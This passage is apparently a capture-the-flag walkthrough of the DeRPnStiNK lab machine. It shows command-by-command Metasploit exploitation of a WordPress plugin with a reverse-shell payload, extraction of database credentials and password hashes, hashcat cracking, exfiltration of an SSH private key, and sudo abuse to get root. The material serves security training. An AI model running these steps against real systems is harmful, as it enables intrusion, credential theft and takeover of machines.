   1  exploit/unix/webapp/wp_slideshowgallery_upload  2014-08-28       excellent  Yes    Wordpress SlideShow Gallery Authenticated File Upload

msf5 > use exploit/unix/webapp/wp_slideshowgallery_upload
[*] Using configured payload php/meterpreter/reverse_tcp

msf5 exploit(unix/webapp/wp_slideshowgallery_upload) >
```

Setting up exploit
```
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set RHOSTS 192.168.1.127
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set TARGETURI /weblog
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set WP_PASSWORD admin
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > set WP_USER admin

msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > show options

Module options (exploit/unix/webapp/wp_slideshowgallery_upload):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.168.1.127    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /weblog          yes       The base path to the wordpress application
   VHOST                         no        HTTP server virtual host
   WP_PASSWORD  admin            yes       Valid password for the provided username
   WP_USER      admin            yes       A valid username


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.102    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WP SlideShow Gallery 1.4.6
```

Running exploit
```
msf5 exploit(unix/webapp/wp_slideshowgallery_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.102:4444
[*] Trying to login as admin
[*] Trying to upload payload
[*] Uploading payload
[*] Calling uploaded file ebxtjkiw.php
[*] Sending stage (38288 bytes) to 192.168.1.127
[*] Meterpreter session 3 opened (192.168.1.102:4444 -> 192.168.1.127:45412) at 2020-10-11 18:33:02 -0400
[+] Deleted ebxtjkiw.php

meterpreter > sysinfo
Computer    : DeRPnStiNK
OS          : Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686
Meterpreter : php/linux
```

### DataBase Info Acquiring

```
meterpreter > cat /var/www/html/weblog/wp-config.php

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         's%|W}Qf|a;(QY-E]Axb-JX~M5rvs8W~mOv Wj)+(%<!b.5Ed/)f^1|5aBS-s;k>/');
define('SECURE_AUTH_KEY',  '[6yT.2HJ#>um@xg@dDzk)m+>qL|i-rpZ($)x}-%B7<j!&-X2R)b#k|%{n-mA-I&0');
define('LOGGED_IN_KEY',    'yOb;5LX`bCjk*l^|X]%ud7|X,*y4}1MNqr|c}Sxly(mt%S+g#kR@K}~mBrG%D[vG');
define('NONCE_KEY',        ')?88dD5Yu(mKJDq)>E1~2%K Cm^HY&] (S7EtEI,X-?n3T)ui#Tfm[t_bz=I-ZK8');
define('AUTH_SALT',        '7,q<zw7`I!N6K>L=]fY:A.[+W`E^``|I+U|W4C(e_Ph `|KVfd{BbRbO?rFp,AN:');
define('SECURE_AUTH_SALT', '14EV-M=x?/lW3ODB7ro^;}&J4&ggBY#xohsa&7ZX/l[Xp,P;DY;AbPDA4oO#<vKd');
define('LOGGED_IN_SALT',   'X7u~-+BjC%vj!Ht<nzu~qs/m[~)C</G7:s,Q$M`zD>X91xC;btxvAe-^/5.(C(|j');
define('NONCE_SALT',       'wi*WOj8Q*+_Vvk23ImDiNDToe3}P>F!$w@Bkz9+BoA/6%{bldVnPb]+l0/U]|;=c');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

DB_NAME: **wordpress** \
DB_USER: **root** \
DB_PASSWORD: **mysql** \
DB_HOST: **localhost**

### MySQL Connect

Using PhPMyAdmin login ( root:mysql )
```
SQL query: SELECT * FROM `wp_users`

ID: 1
user_login: unclestinky
user_pass: $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
user_nicename: unclestinky
user_email: unclestinky@DeRPnStiNK.local
user_url:
user_registered: 2017-11-12 03:25:32
user_activation_key: 1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1
user_status: 0
display_name: unclestinky
flag2:

ID: 2
user_login: admin
user_pass: $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/
user_nicename: admin
user_email: admin@derpnstink.local
user_url:
user_registered: 2017-11-13 04:29:35
user_activation_key:
user_status: 0
display_name: admin
flag2:
```

Credentials: \
**unclestinky** : **$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41** \
**admin** : **$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/**

### Flag #2

```
SQL query: SELECT * FROM `wp_posts`

flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
```

### Credentials Cracking

Hash identification
```
$ hash-identifier

   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41

Possible Hashs:
[+] MD5(Wordpress)
--------------------------------------------------
```

Cracking MD5 Hash
```

$ cat credentials.hash
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41
$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/

$ hashcat -m 400 credentials.hash /usr/share/wordlists/rockyou.txt

hashcat (v6.0.0) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-5500U CPU @ 2.40GHz, 5854/5918 MB (2048 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

INFO: Removed 1 hash found in potfile.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344393
* Bytes.....: 139921516
* Keyspace..: 14344386
* Runtime...: 1 sec

$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41:wedgie57
$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/:admin

Session..........: hashcat
Status...........: Cracked
Hash.Name........: phpass
Hash.Target......: credentials.hash
Time.Started.....: Sun Oct 11 19:40:10 2020 (1 sec)
Time.Estimated...: Sun Oct 11 19:40:11 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1533 H/s (10.20ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts
Progress.........: 256/28688772 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 0/14344386 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:7168-8192
Candidates.#1....: 123456 -> 555555

Started: Sun Oct 11 19:40:08 2020
Stopped: Sun Oct 11 19:40:12 2020
```

Credentials: **unclestinky** : **wedgie57**

### Privilege Escalation

Spwaning a shell
```
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'

www-data@DeRPnStiNK:/var/www/html/temporary$
```

Changing to stinky user
```
www-data@DeRPnStiNK:/var/www/html/temporary$ su stinky
Password: wedgie57

stinky@DeRPnStiNK:/var/www/html/temporary$
```

### SSH Access

Copying `stinky` SSH key to `/var/www/html/temporary/` so we can download it on host machine and access via SSH
```
stinky@DeRPnStiNK:~$ cp .ssh/id_rsa /var/www/html/temporary/

$ wget http://192.168.1.127/temporary/id_rsa

$ chmod 600 id_rsa

$ ssh -i id_rsa stinky@192.168.1.127
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

501 packages can be updated.
415 updates are security updates.

Last login: Sun Oct 11 21:42:35 2020 from 192.168.1.102
stinky@DeRPnStiNK:~$ id
uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
```

### Flag #3

```
stinky@DeRPnStiNK:~$ cat Desktop/flag.txt

flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
```

### Network Packet Capture File

In `/home/stinky/Documents` we have a `.pcap` file. I downloaded it and open with `Wireshark`.
```
stinky@DeRPnStiNK:~/Documents$ ls
derpissues.pcap

$ scp -i id_rsa stinky@192.168.1.127:/home/stinky/Documents/derpissues.pcap /home/kali/Desktop/capture.pcap
```

After analyse the traffic, we can found an Derp login packets.
```
127.0.0.1 -> 127.0.0.1 HTTP POST /weblog/wp-login.php HTTP/1.1

Form item: "log" = "mrderp"
Form item: "pwd" = "derpderpderpderpderpderpderp"
```

Credentials: **mrderp** : **derpderpderpderpderpderpderp**

### Privilege Escalation

Horizontal escalation to `mrderp` user
```
stinky@DeRPnStiNK:/home$ su mrderp
Password: derpderpderpderpderpderpderp

mrderp@DeRPnStiNK:/$ id
uid=1000(mrderp) gid=1000(mrderp) groups=1000(mrderp)
```

Apparently `mrderp` is allow to run commands as super user when the binary follow this rule: ( /home/mrderp/binaries/derpy* )
```
mrderp@DeRPnStiNK:/$ sudo -l
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

Validating the super user privilege
```
mrderp@DeRPnStiNK:~/binaries$ cat derpy.sh
#!/bin/bash
id

mrderp@DeRPnStiNK:~/binaries$ ./derpy.sh
uid=1000(mrderp) gid=1000(mrderp) groups=1000(mrderp)

mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
uid=0(root) gid=0(root) groups=0(root)
```

Spawning root bash
```
mrderp@DeRPnStiNK:~/binaries$ cat derpy.sh
#!/bin/bash
/bin/bash

mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
root@DeRPnStiNK:~/binaries#
```

### Flag #4

```
root@DeRPnStiNK:/root/Desktop# cat flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!
Hit me up on twitter and let me know your thoughts!
@securekomodo
```

